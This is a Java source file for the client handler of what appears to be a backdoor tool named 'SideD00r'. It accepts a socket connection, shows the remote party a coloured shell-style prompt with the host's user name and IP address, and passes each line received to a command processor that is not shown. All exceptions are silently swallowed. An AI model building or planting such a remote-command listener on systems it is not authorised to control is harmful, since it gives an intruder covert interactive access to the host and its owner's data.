package me.aaronakhtar.sided00r.threads.handlers;

import me.aaronakhtar.sided00r.Input;
import me.aaronakhtar.sided00r.art.SideD00rArt;
import me.aaronakhtar.sided00r.art.TermUtils;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.InetAddress;
import java.net.Socket;

public class SideD00rClientHandler implements Runnable {

    public BufferedReader reader;
    public BufferedWriter writer;

    public static String getPrefix() {
        return TermUtils.Colour.YELLOW.get() + System.getProperty("user.name") + TermUtils.Colour.WHITE.get() + "@" + TermUtils.Colour.RED.get() + "SideD000r > " + TermUtils.Colour.RESET.get();
    }

    private Socket socket;

    public SideD00rClientHandler(Socket socket) {
        this.socket = socket;
    }

    @Override
    public void run() {
        try (Socket socket = this.socket; BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream())); BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()))) {
            this.reader = reader;
            this.writer = writer;
            TermUtils.setTerminalName("SideD00r @" + InetAddress.getLocalHost().getHostAddress(), writer);
            SideD00rArt.beginWelcomeArtProcess(writer);
            while (true) {
                writer.write(getPrefix());
                writer.flush();
                final String i = reader.readLine();
                new Thread() {
                    @Override
                    public void run() {
                        try {
                            Input.processInput(i, writer);
                            Thread.sleep(3400);
                        }catch (Exception e){

                        }
                    }
                }.start();
            }


        } catch (Exception e) {

        }
    }


}
